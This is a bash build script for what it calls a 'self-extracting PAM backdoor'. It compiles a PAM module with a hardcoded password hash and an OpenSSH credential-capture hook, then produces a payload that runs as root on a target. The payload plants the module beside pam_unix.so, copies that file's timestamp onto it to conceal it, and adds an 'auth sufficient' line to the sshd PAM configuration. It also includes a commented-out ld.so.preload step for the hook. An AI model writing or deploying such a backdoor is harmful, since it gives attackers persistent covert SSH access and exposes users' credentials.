#!/bin/bash
#
# Build deployable payload
# Usage: ./build.sh <password> [arch]
# Output: Self-extracting bash script to stdout
#
# Example:
#   ./build.sh mypassword > payload.sh
#   scp payload.sh target:/tmp/
#   ssh target "bash /tmp/payload.sh"
#

set -e

PASSWORD="${1:?usage: $0 <password> [arch]}"
ARCH="${2:-x86_64}"

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
TEMPLATE="$SCRIPT_DIR/pam_template.c"
WORKDIR="$SCRIPT_DIR/.build"
mkdir -p "$WORKDIR"
trap "rm -rf $WORKDIR" EXIT

# Compile template with placeholder
cd "$WORKDIR"

case "$ARCH" in
    x86_64|amd64)
        CC="gcc"
        ;;
    *)
        echo "Unsupported arch: $ARCH" >&2
        exit 1
        ;;
esac

# Build PAM module
$CC -fPIC -shared -O3 -s -fvisibility=hidden \
    -o pam_auth.so "$TEMPLATE" \
    -lpam 2>/dev/null

# Build hook for OpenSSH 9.x cred capture
$CC -fPIC -shared -O2 -s -o pam_hook.so "$SCRIPT_DIR/pam_hook.c" -ldl 2>/dev/null

# Find placeholder offset (unique pattern)
# Pattern: DEADBEEFCAFEBABE0123456789ABCDEFFEDCBA9876543210133742 69BEEFCAFE
PLACEHOLDER=$(printf '\xDE\xAD\xBE\xEF\xCA\xFE\xBA\xBE\x01\x23\x45\x67\x89\xAB\xCD\xEF\xFE\xDC\xBA\x98\x76\x54\x32\x10\x13\x37\x42\x69\xBE\xEF\xCA\xFE')
OFFSET=$(grep -boa "$PLACEHOLDER" pam_auth.so 2>/dev/null | cut -d: -f1)

if [ -z "$OFFSET" ]; then
    echo "ERROR: Placeholder not found in binary" >&2
    exit 1
fi

# Generate password hash
HASH=$(printf '%s' "$PASSWORD" | sha256sum | cut -d' ' -f1)

# Convert hash to binary
HASH_BIN=""
for i in $(seq 0 2 62); do
    HASH_BIN="$HASH_BIN\\x${HASH:$i:2}"
done

# Base64 encode both .so files
SO_B64=$(base64 -w0 pam_auth.so)
HOOK_B64=$(base64 -w0 pam_hook.so)

# Generate self-extracting payload
cat << 'PAYLOAD_HEAD'
#!/bin/bash
# Self-extracting PAM backdoor
# No compiler needed on target
[ "$(id -u)" -ne 0 ] && echo "root required" && exit 1

PAYLOAD_HEAD

cat << PAYLOAD_VARS
OFFSET=$OFFSET
HASH_BIN="$HASH_BIN"
SO_B64="$SO_B64"
HOOK_B64="$HOOK_B64"
PAYLOAD_VARS

cat << 'PAYLOAD_TAIL'

# Decode PAM module
SO_FILE=$(mktemp)
echo "$SO_B64" | base64 -d > "$SO_FILE"

# Patch hash at offset
printf "$HASH_BIN" | dd of="$SO_FILE" bs=1 seek=$OFFSET conv=notrunc 2>/dev/null

# Find PAM directory
PAM_DIR=$(dirname $(find /lib* /usr/lib* -name "pam_unix.so" 2>/dev/null | head -1) 2>/dev/null)
[ -z "$PAM_DIR" ] && echo "PAM not found" && rm "$SO_FILE" && exit 1

# Deploy PAM module
cp "$SO_FILE" "$PAM_DIR/pam_auth.so"
chown root:root "$PAM_DIR/pam_auth.so"
chmod 644 "$PAM_DIR/pam_auth.so"
touch -r "$PAM_DIR/pam_unix.so" "$PAM_DIR/pam_auth.so"
rm "$SO_FILE"

# Configure PAM
grep -q "pam_auth.so" /etc/pam.d/sshd || sed -i '1a auth sufficient pam_auth.so' /etc/pam.d/sshd
grep -q "session.*pam_auth.so" /etc/pam.d/sshd || echo "session optional pam_auth.so" >> /etc/pam.d/sshd

# Skip hook - requires matching glibc version, can break sshd on older systems
# To enable: echo "$HOOK_B64" | base64 -d > /lib/pam_hook.so && echo "/lib/pam_hook.so" > /etc/ld.so.preload

echo "deployed"
PAYLOAD_TAIL
